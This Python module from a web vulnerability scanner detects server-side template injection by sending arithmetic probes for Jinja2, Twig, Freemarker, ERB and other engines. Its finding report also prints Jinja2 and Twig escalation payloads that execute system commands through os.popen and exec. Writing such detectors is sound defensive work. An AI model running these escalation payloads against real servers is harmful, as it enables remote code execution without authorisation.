"""Server-Side Template Injection (SSTI) detection module.

Detection strategy:
  1. Math probe -- inject unique arithmetic expressions (e.g. {{7*7}}) and check
     whether the server evaluates them and returns the result (e.g. "49").
  2. Multi-engine coverage -- payloads target Jinja2, Twig, Freemarker, Smarty,
     Mako, Pebble, Velocity, ERB, and generic expression engines.
  3. Append + replace modes -- numeric parameters get the expression appended;
     string parameters get the expression as the full value.

References:
  - PortSwigger SSTI research: https://portswigger.net/research/server-side-template-injection
  - PayloadsAllTheThings SSTI cheatsheet
"""

import re
import random
from typing import Dict, List, Optional, Tuple

import logging

from .base import BaseModule, Finding
from ..parser import build_curl_command, inject_into_params, rebuild_url_with_params

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# Math-based detection payloads
# ---------------------------------------------------------------------------
# Each tuple: (payload_template, expected_result, engine_hint)
# The payloads use multiplication because:
#   - The factors are unlikely to appear naturally in the page
#   - The product is specific enough to confirm evaluation
#   - No side effects (unlike RCE payloads)

_MATH_PROBES: List[Tuple[str, str, str]] = [
    # Jinja2 / Twig (Python / PHP)
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("{{4*4}}aa{{7*7}}", "16aa49", "Jinja2/Twig"),
    # Freemarker (Java)
    ("${7*7}", "49", "Freemarker/Generic"),
    ("#{7*7}", "49", "Ruby ERB/Generic"),
    # Smarty (PHP)
    ("{7*7}", "49", "Smarty"),
    # Mako (Python)
    ("${7*7}", "49", "Mako/Freemarker"),
    # Pebble (Java)
    ("{{7*7}}", "49", "Pebble/Jinja2"),
    # ERB (Ruby)
    ("<%= 7*7 %>", "49", "ERB"),
    # Velocity (Java)
    ("#set($x=7*7)${x}", "49", "Velocity"),
    # Tornado (Python)
    ("{{7*7}}", "49", "Tornado"),
    # Slim / Jade (Node)
    ("#{7*7}", "49", "Slim/Jade"),
]

# Unique probes that reduce false positives by using uncommon numbers
_UNIQUE_PROBES: List[Tuple[str, str, str]] = [
    ("{{43*47}}", "2021", "Jinja2/Twig"),
    ("${43*47}", "2021", "Freemarker/Mako"),
    ("<%= 43*47 %>", "2021", "ERB"),
    ("{{17*19}}", "323", "Jinja2/Twig"),
    ("${17*19}", "323", "Freemarker/Mako"),
    ("{{29*31}}", "899", "Jinja2/Twig"),
    ("${29*31}", "899", "Freemarker/Mako"),
]

# String concatenation probes (detect engines that don't eval math)
_CONCAT_PROBES: List[Tuple[str, str, str]] = [
    ("{{'okr'+'scn'}}", "okrscn", "Jinja2"),
    ("${'okr'+'scn'}", "okrscn", "Freemarker"),
    ("<%= 'okr'+'scn' %>", "okrscn", "ERB"),
]


class SSTIScanner(BaseModule):
    """Detects Server-Side Template Injection via math evaluation probes."""

    NAME = "ssti"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Test *param_name* for SSTI."""
        findings: List[Finding] = []

        # Phase 1: quick unique-number probes (low false positive rate)
        finding = self._test_probes(
            url, method, params, param_name, _UNIQUE_PROBES, phase="unique-math",
        )
        if finding:
            findings.append(finding)
            return findings

        # Phase 2: standard math probes (broader engine coverage)
        finding = self._test_probes(
            url, method, params, param_name, _MATH_PROBES, phase="math",
        )
        if finding:
            findings.append(finding)
            return findings

        # Phase 3: string concatenation probes
        finding = self._test_probes(
            url, method, params, param_name, _CONCAT_PROBES, phase="concat",
        )
        if finding:
            findings.append(finding)

        return findings

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _send(self, url: str, method: str, params: Dict[str, str]):
        if method == "GET":
            return self.http.get(rebuild_url_with_params(url, params))
        return self.http.post(url, data=params)

    def _test_probes(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        probes: List[Tuple[str, str, str]],
        phase: str,
    ) -> Optional[Finding]:
        """Inject each probe and check whether the evaluated result appears."""
        original_value = params.get(param_name, "")

        for payload_tpl, expected, engine in probes:
            # --- append mode (e.g. id=1{{7*7}}) ---
            appended = original_value + payload_tpl
            resp = self._send(
                url, method, inject_into_params(params, param_name, appended),
            )
            if resp is not None:
                confirmed, evidence = self._check_evaluation(
                    resp.text, expected, payload_tpl, original_value,
                )
                if confirmed:
                    logger.debug(
                        "[SSTI] %s=%r -> %s (append, %s)",
                        param_name, appended, expected, engine,
                    )
                    return self._make_finding(
                        url, method, param_name, appended,
                        expected, engine, evidence, phase,
                    )

            # --- replace mode (e.g. id={{7*7}}) ---
            resp = self._send(
                url, method, inject_into_params(params, param_name, payload_tpl),
            )
            if resp is not None:
                confirmed, evidence = self._check_evaluation(
                    resp.text, expected, payload_tpl, original_value,
                )
                if confirmed:
                    logger.debug(
                        "[SSTI] %s=%r -> %s (replace, %s)",
                        param_name, payload_tpl, expected, engine,
                    )
                    return self._make_finding(
                        url, method, param_name, payload_tpl,
                        expected, engine, evidence, phase,
                    )

        return None

    @staticmethod
    def _check_evaluation(
        html: str,
        expected: str,
        payload: str,
        original_value: str,
    ) -> Tuple[bool, str]:
        """Return (True, evidence) if *expected* appears but the raw template syntax does not.

        We require:
          1. The evaluated result (e.g. "49") is in the response.
          2. The raw template expression (e.g. "{{7*7}}") is NOT in the response
             (if it is, the engine is echoing literal text, not evaluating).
          3. The expected result was not already present in the original_value
             (guard against a param like id=49 trivially matching).
        """
        # Guard: expected result shouldn't be just the original value echoed
        if expected == original_value:
            return False, ""

        if expected not in html:
            return False, ""

        # Raw template still visible? Then it was not evaluated.
        if payload in html:
            return False, ""

        # Extract context around the match
        idx = html.index(expected)
        start = max(0, idx - 50)
        end = min(len(html), idx + len(expected) + 50)
        snippet = html[start:end].replace("\n", " ")

        return True, f"Template evaluated: {payload} -> {expected} in response: ...{snippet!r}..."

    def _make_finding(
        self,
        url: str,
        method: str,
        param_name: str,
        payload: str,
        expected: str,
        engine: str,
        evidence: str,
        phase: str,
    ) -> Finding:
        confidence = "high" if phase == "unique-math" else "medium"
        params = {param_name: payload}
        curl = build_curl_command(url, method, params, param_name, payload)
        return Finding(
            vuln_type=f"Server-Side Template Injection (SSTI)",
            url=url,
            method=method,
            parameter=param_name,
            payload=payload,
            evidence=evidence,
            confidence=confidence,
            details=(
                f"The server evaluates template expressions in parameter {param_name!r}. "
                f"Payload {payload!r} was evaluated to {expected!r} (engine hint: {engine}). "
                f"SSTI can lead to Remote Code Execution (RCE). "
                f"Remediation: never pass user input into template render calls; "
                f"use sandboxed template environments."
            ),
            reproduction=(
                f"# 1. Send the math expression and check if the server evaluates it:\n"
                f"{curl}\n"
                f"# 2. Search for '{expected}' in the response body.\n"
                f"#    If present AND the raw template '{payload}' is NOT present,\n"
                f"#    the server evaluated the expression (SSTI confirmed).\n"
                f"# 3. Engine hint: {engine}. Try escalation payloads:\n"
                f"#    Jinja2 RCE: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n"
                f"#    Twig RCE:   {{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}"
            ),
        )
